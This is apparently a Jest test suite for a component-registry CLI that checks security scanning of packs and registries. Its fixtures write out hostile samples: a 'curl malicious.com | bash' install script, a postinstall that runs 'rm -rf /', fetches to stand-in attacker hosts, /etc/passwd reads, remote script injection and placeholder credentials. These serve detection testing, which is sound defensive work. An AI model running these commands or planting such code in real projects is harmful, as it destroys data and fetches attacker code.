import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const execAsync = promisify(exec);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

describe('🔐 Security & Trust Validation', () => {
  const testDir = path.join(__dirname, 'temp-security-trust');
  const cliPath = path.join(__dirname, '..', 'bin', 'dcp.js');
  
  beforeEach(async () => {
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch (error) {
      // Directory might not exist
    }
    await fs.mkdir(testDir, { recursive: true });
  });
  
  afterEach(async () => {
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch (error) {
      // Directory might not exist
    }
  });

  describe('Dependency Audit', () => {
    it('should validate all peerDependencies are scoped and resolved', async () => {
      const registry = {
        name: 'dependency-test',
        version: '1.0.0',
        components: [
          {
            name: 'SafeComponent',
            peerDependencies: {
              'react': '^18.0.0',
              '@types/react': '^18.0.0',
              'react-dom': '^18.0.0'
            },
            dependencies: {
              'clsx': '^2.0.0',
              'class-variance-authority': '^0.7.0'
            }
          },
          {
            name: 'UnsafeComponent',
            peerDependencies: {
              'unscoped-package': '*',  // Invalid: unscoped wildcard
              'react': 'latest',  // Invalid: non-semver
              '@malicious/package': '^1.0.0'  // Suspicious package name
            },
            dependencies: {
              'unknown-package': '^1.0.0'  // Unverifiable package
            }
          }
        ]
      };
      
      const registryPath = path.join(testDir, 'dependencies.json');
      await fs.writeFile(registryPath, JSON.stringify(registry, null, 2));
      
      const { stdout } = await execAsync(
        `node "${cliPath}" validate "${registryPath}" --security-audit --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      // Should flag security issues
      if (result.securityWarnings || result.errors) {
        const issues = [...(result.errors || []), ...(result.securityWarnings || [])];
        
        // Should flag unscoped wildcard
        expect(issues.some(issue => issue.includes('unscoped-package') && issue.includes('wildcard'))).toBe(true);
        
        // Should flag non-semver version
        expect(issues.some(issue => issue.includes('latest') && issue.includes('semver'))).toBe(true);
        
        // Should flag suspicious package names
        expect(issues.some(issue => issue.includes('malicious'))).toBe(true);
      }
    });

    it('should check dependencies against known vulnerability database', async () => {
      const registry = {
        name: 'vulnerability-test',
        version: '1.0.0',
        components: [
          {
            name: 'VulnerableComponent',
            dependencies: {
              // These would be flagged by actual vulnerability scanning
              'lodash': '4.17.20',  // Known vulnerable version
              'moment': '2.29.1',   // Deprecated package
              'request': '2.88.2'   // Deprecated with security issues
            }
          }
        ]
      };
      
      const registryPath = path.join(testDir, 'vulnerable.json');
      await fs.writeFile(registryPath, JSON.stringify(registry, null, 2));
      
      try {
        const { stdout } = await execAsync(
          `node "${cliPath}" validate "${registryPath}" --check-vulnerabilities --json`
        );
        
        const result = JSON.parse(stdout.trim());
        
        if (result.vulnerabilities) {
          // Should detect known vulnerable packages
          expect(result.vulnerabilities.some(vuln => vuln.package === 'lodash')).toBe(true);
          expect(result.vulnerabilities.some(vuln => vuln.package === 'moment')).toBe(true);
          expect(result.vulnerabilities.some(vuln => vuln.package === 'request')).toBe(true);
        }
      } catch (error) {
        // Acceptable if vulnerability checking requires network/database
        const output = error.stdout || error.stderr || '';
        if (!output.includes('network') && !output.includes('database')) {
          throw error;
        }
      }
    });

    it('should validate license compatibility', async () => {
      const registry = {
        name: 'license-test',
        version: '1.0.0',
        license: 'MIT',
        components: [
          {
            name: 'CompatibleComponent',
            dependencies: {
              'mit-package': '^1.0.0',
              'apache-package': '^2.0.0',
              'bsd-package': '^1.0.0'
            },
            dependencyLicenses: {
              'mit-package': 'MIT',
              'apache-package': 'Apache-2.0',
              'bsd-package': 'BSD-3-Clause'
            }
          },
          {
            name: 'IncompatibleComponent',
            dependencies: {
              'gpl-package': '^1.0.0',
              'copyleft-package': '^1.0.0'
            },
            dependencyLicenses: {
              'gpl-package': 'GPL-3.0',
              'copyleft-package': 'AGPL-3.0'
            }
          }
        ]
      };
      
      const registryPath = path.join(testDir, 'licenses.json');
      await fs.writeFile(registryPath, JSON.stringify(registry, null, 2));
      
      const { stdout } = await execAsync(
        `node "${cliPath}" validate "${registryPath}" --check-licenses --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      // Should warn about GPL incompatibility with MIT
      if (result.licenseWarnings) {
        expect(result.licenseWarnings.some(warning => 
          warning.includes('GPL') && warning.includes('incompatible')
        )).toBe(true);
      }
    });
  });

  describe('File Whitelist Validation', () => {
    it('should detect hidden and unwanted files in packs', async () => {
      const componentDir = path.join(testDir, 'malicious-component');
      await fs.mkdir(componentDir, { recursive: true });
      
      // Create legitimate files
      await fs.writeFile(path.join(componentDir, 'Button.tsx'), 'export const Button = () => <button />;');
      await fs.writeFile(path.join(componentDir, 'Button.test.tsx'), 'test("Button", () => {});');
      await fs.writeFile(path.join(componentDir, 'README.md'), '# Button Component');
      
      // Create suspicious files
      await fs.writeFile(path.join(componentDir, '.env'), 'SECRET_KEY=abc123');
      await fs.writeFile(path.join(componentDir, '.env.local'), 'API_KEY=xyz789');
      await fs.writeFile(path.join(componentDir, 'config.json'), '{"secretToken": "malicious"}');
      
      // Create hidden directories
      const hiddenDir = path.join(componentDir, '.git');
      await fs.mkdir(hiddenDir, { recursive: true });
      await fs.writeFile(path.join(hiddenDir, 'config'), '[core]');
      
      // Create suspicious scripts
      await fs.writeFile(path.join(componentDir, 'install.sh'), '#!/bin/bash\ncurl malicious.com | bash');
      await fs.writeFile(path.join(componentDir, 'postinstall.js'), 'require("child_process").exec("rm -rf /");');
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --security-scan --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      // Should detect all suspicious files
      if (result.securityIssues || result.warnings) {
        const issues = [...(result.securityIssues || []), ...(result.warnings || [])];
        
        expect(issues.some(issue => issue.includes('.env'))).toBe(true);
        expect(issues.some(issue => issue.includes('.git'))).toBe(true);
        expect(issues.some(issue => issue.includes('install.sh'))).toBe(true);
        expect(issues.some(issue => issue.includes('postinstall.js'))).toBe(true);
      }
    });

    it('should validate only expected file types are included', async () => {
      const componentDir = path.join(testDir, 'file-types');
      await fs.mkdir(componentDir, { recursive: true });
      
      // Valid files
      await fs.writeFile(path.join(componentDir, 'Component.tsx'), 'export const Component = () => <div />;');
      await fs.writeFile(path.join(componentDir, 'Component.test.ts'), 'test("Component", () => {});');
      await fs.writeFile(path.join(componentDir, 'styles.css'), '.component { color: red; }');
      await fs.writeFile(path.join(componentDir, 'README.md'), '# Component');
      await fs.writeFile(path.join(componentDir, 'package.json'), '{"name": "component"}');
      
      // Invalid file types
      await fs.writeFile(path.join(componentDir, 'malware.exe'), 'binary data');
      await fs.writeFile(path.join(componentDir, 'script.bat'), '@echo off');
      await fs.writeFile(path.join(componentDir, 'data.zip'), 'archive data');
      await fs.writeFile(path.join(componentDir, 'image.svg'), '<svg></svg>'); // Could be suspicious
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --validate-file-types --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      if (result.fileTypeWarnings || result.errors) {
        const issues = [...(result.errors || []), ...(result.fileTypeWarnings || [])];
        
        expect(issues.some(issue => issue.includes('.exe'))).toBe(true);
        expect(issues.some(issue => issue.includes('.bat'))).toBe(true);
        expect(issues.some(issue => issue.includes('.zip'))).toBe(true);
      }
    });

    it('should check for obfuscated or minified code', async () => {
      const componentDir = path.join(testDir, 'obfuscated');
      await fs.mkdir(componentDir, { recursive: true });
      
      // Normal readable code
      const normalCode = `
        interface Props {
          label: string;
        }
        
        export const NormalComponent = ({ label }: Props) => {
          return <button>{label}</button>;
        };
      `;
      
      // Obfuscated/minified code
      const obfuscatedCode = `
        const _0x1a2b=['button','label'];const _0x3c4d=function(_0x5e6f,_0x7a8b){_0x5e6f=_0x5e6f-0x0;let _0x9c1d=_0x1a2b[_0x5e6f];return _0x9c1d;};export const ObfuscatedComponent=({label})=>{return React[_0x3c4d('0x0')](_0x3c4d('0x1'),null,label);};
      `;
      
      // Suspiciously long single line
      const suspiciousCode = `export const SuspiciousComponent=()=>{${'a'.repeat(10000)};return <div />;}`;
      
      await fs.writeFile(path.join(componentDir, 'Normal.tsx'), normalCode);
      await fs.writeFile(path.join(componentDir, 'Obfuscated.tsx'), obfuscatedCode);
      await fs.writeFile(path.join(componentDir, 'Suspicious.tsx'), suspiciousCode);
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --detect-obfuscation --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      if (result.obfuscationWarnings) {
        expect(result.obfuscationWarnings.some(warning => 
          warning.includes('Obfuscated.tsx')
        )).toBe(true);
        
        expect(result.obfuscationWarnings.some(warning => 
          warning.includes('Suspicious.tsx')
        )).toBe(true);
      }
    });
  });

  describe('Code Content Analysis', () => {
    it('should detect potentially malicious code patterns', async () => {
      const componentDir = path.join(testDir, 'malicious-code');
      await fs.mkdir(componentDir, { recursive: true });
      
      const maliciousPatterns = [
        // Network requests to suspicious domains
        `
          export const NetworkComponent = () => {
            fetch('http://malicious-site.com/steal-data')
              .then(r => r.json())
              .then(data => localStorage.setItem('stolen', JSON.stringify(data)));
            return <div>Innocent component</div>;
          };
        `,
        
        // File system access
        `
          import fs from 'fs';
          export const FileComponent = () => {
            fs.readFile('/etc/passwd', 'utf8', (err, data) => {
              console.log(data);
            });
            return <div>File reader</div>;
          };
        `,
        
        // Dynamic code execution
        `
          export const EvalComponent = ({ code }: { code: string }) => {
            eval(code); // Dangerous!
            return <div>Dynamic component</div>;
          };
        `,
        
        // Base64 encoded content (could be hiding malicious code)
        `
          export const EncodedComponent = () => {
            const malicious = atob('bWFsaWNpb3VzIGNvZGUgaGVyZQ==');
            new Function(malicious)();
            return <div>Encoded</div>;
          };
        `,
        
        // External script injection
        `
          export const ScriptComponent = () => {
            const script = document.createElement('script');
            script.src = 'https://evil.com/malware.js';
            document.head.appendChild(script);
            return <div>Script loader</div>;
          };
        `
      ];
      
      for (let i = 0; i < maliciousPatterns.length; i++) {
        await fs.writeFile(
          path.join(componentDir, `Malicious${i}.tsx`), 
          maliciousPatterns[i]
        );
      }
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --security-analysis --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      if (result.securityThreats || result.warnings) {
        const threats = [...(result.securityThreats || []), ...(result.warnings || [])];
        
        // Should detect network requests
        expect(threats.some(threat => threat.includes('fetch') || threat.includes('network'))).toBe(true);
        
        // Should detect file system access
        expect(threats.some(threat => threat.includes('fs') || threat.includes('file'))).toBe(true);
        
        // Should detect eval usage
        expect(threats.some(threat => threat.includes('eval'))).toBe(true);
        
        // Should detect base64/encoded content
        expect(threats.some(threat => threat.includes('base64') || threat.includes('encoded'))).toBe(true);
        
        // Should detect script injection
        expect(threats.some(threat => threat.includes('script') || threat.includes('injection'))).toBe(true);
      }
    });

    it('should validate imports are from trusted sources', async () => {
      const componentDir = path.join(testDir, 'imports');
      await fs.mkdir(componentDir, { recursive: true });
      
      const trustedImports = `
        import React from 'react';
        import { Button } from '@mui/material';
        import { clsx } from 'clsx';
        import { useRouter } from 'next/router';
        
        export const TrustedComponent = () => {
          return <Button>Trusted</Button>;
        };
      `;
      
      const suspiciousImports = `
        import malicious from 'http://evil.com/package';
        import { steal } from '@malicious/data-stealer';
        import suspicious from '../../../../../../../etc/passwd';
        import crypto from 'crypto-js-malicious';
        
        export const SuspiciousComponent = () => {
          return <div>Suspicious</div>;
        };
      `;
      
      await fs.writeFile(path.join(componentDir, 'Trusted.tsx'), trustedImports);
      await fs.writeFile(path.join(componentDir, 'Suspicious.tsx'), suspiciousImports);
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --validate-imports --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      if (result.importWarnings || result.securityIssues) {
        const issues = [...(result.importWarnings || []), ...(result.securityIssues || [])];
        
        // Should flag HTTP imports
        expect(issues.some(issue => issue.includes('http://') && issue.includes('evil.com'))).toBe(true);
        
        // Should flag suspicious package names
        expect(issues.some(issue => issue.includes('@malicious'))).toBe(true);
        
        // Should flag path traversal attempts
        expect(issues.some(issue => issue.includes('../../../'))).toBe(true);
        
        // Should flag typosquatting attempts
        expect(issues.some(issue => issue.includes('crypto-js-malicious'))).toBe(true);
      }
    });

    it('should detect hardcoded secrets and credentials', async () => {
      const componentDir = path.join(testDir, 'secrets');
      await fs.mkdir(componentDir, { recursive: true });
      
      const componentWithSecrets = `
        export const UnsafeComponent = () => {
          const apiKey = 'sk-1234567890abcdef1234567890abcdef'; // OpenAI API key pattern
          const dbPassword = 'mySecretPassword123!';
          const awsKey = 'AKIAIOSFODNN7EXAMPLE';
          const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
          
          // Various API endpoints with potential secrets
          fetch('https://api.service.com/data?token=abc123secret');
          
          return <div>Component with secrets</div>;
        };
      `;
      
      const cleanComponent = `
        export const SafeComponent = () => {
          const apiKey = process.env.REACT_APP_API_KEY;
          const config = {
            endpoint: process.env.REACT_APP_ENDPOINT,
            token: process.env.REACT_APP_TOKEN
          };
          
          return <div>Safe component</div>;
        };
      `;
      
      await fs.writeFile(path.join(componentDir, 'Unsafe.tsx'), componentWithSecrets);
      await fs.writeFile(path.join(componentDir, 'Safe.tsx'), cleanComponent);
      
      const { stdout } = await execAsync(
        `node "${cliPath}" extract "${componentDir}" --detect-secrets --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      if (result.secretsFound || result.securityWarnings) {
        const secrets = [...(result.secretsFound || []), ...(result.securityWarnings || [])];
        
        // Should detect API key patterns
        expect(secrets.some(secret => secret.includes('sk-') || secret.includes('API key'))).toBe(true);
        
        // Should detect AWS keys
        expect(secrets.some(secret => secret.includes('AKIA') || secret.includes('AWS'))).toBe(true);
        
        // Should detect JWT tokens
        expect(secrets.some(secret => secret.includes('eyJ') || secret.includes('JWT'))).toBe(true);
        
        // Should detect hardcoded passwords
        expect(secrets.some(secret => secret.includes('Password') || secret.includes('secret'))).toBe(true);
      }
    });
  });

  describe('Registry Integrity', () => {
    it('should validate registry signature and checksums', async () => {
      const registry = {
        name: 'signed-registry',
        version: '1.0.0',
        components: [
          { name: 'Component1', props: {} },
          { name: 'Component2', props: {} }
        ],
        integrity: {
          checksum: 'sha256-abcdef1234567890',
          signature: 'invalid-signature-data'
        }
      };
      
      const registryPath = path.join(testDir, 'signed.json');
      await fs.writeFile(registryPath, JSON.stringify(registry, null, 2));
      
      try {
        const { stdout } = await execAsync(
          `node "${cliPath}" validate "${registryPath}" --verify-integrity --json`
        );
        
        const result = JSON.parse(stdout.trim());
        
        // Should verify checksums and signatures
        if (result.integrityCheck) {
          expect(result.integrityCheck.checksumValid).toBeDefined();
          expect(result.integrityCheck.signatureValid).toBeDefined();
        }
      } catch (error) {
        // Acceptable if integrity checking isn't implemented yet
        const output = error.stdout || error.stderr || '';
        if (!output.includes('not implemented')) {
          throw error;
        }
      }
    });

    it('should detect tampering with registry metadata', async () => {
      const originalRegistry = {
        name: 'original-registry',
        version: '1.0.0',
        checksum: 'original-checksum',
        components: [
          { name: 'Button', props: { variant: { type: 'string' } } }
        ]
      };
      
      const tamperedRegistry = {
        name: 'original-registry', // Same name but different content
        version: '1.0.0',
        checksum: 'original-checksum', // Same checksum but content changed
        components: [
          { 
            name: 'Button', 
            props: { 
              variant: { type: 'string' },
              // Maliciously added prop
              __dangerous: { type: 'function' }
            }
          }
        ]
      };
      
      const originalPath = path.join(testDir, 'original.json');
      const tamperedPath = path.join(testDir, 'tampered.json');
      
      await fs.writeFile(originalPath, JSON.stringify(originalRegistry, null, 2));
      await fs.writeFile(tamperedPath, JSON.stringify(tamperedRegistry, null, 2));
      
      const { stdout } = await execAsync(
        `node "${cliPath}" diff "${originalPath}" "${tamperedPath}" --security-check --json`
      );
      
      const result = JSON.parse(stdout.trim());
      
      // Should detect the tampering
      if (result.securityChanges || result.warnings) {
        const issues = [...(result.securityChanges || []), ...(result.warnings || [])];
        
        expect(issues.some(issue => 
          issue.includes('checksum') && issue.includes('mismatch')
        )).toBe(true);
        
        expect(issues.some(issue => 
          issue.includes('__dangerous') || issue.includes('suspicious')
        )).toBe(true);
      }
    });
  });
});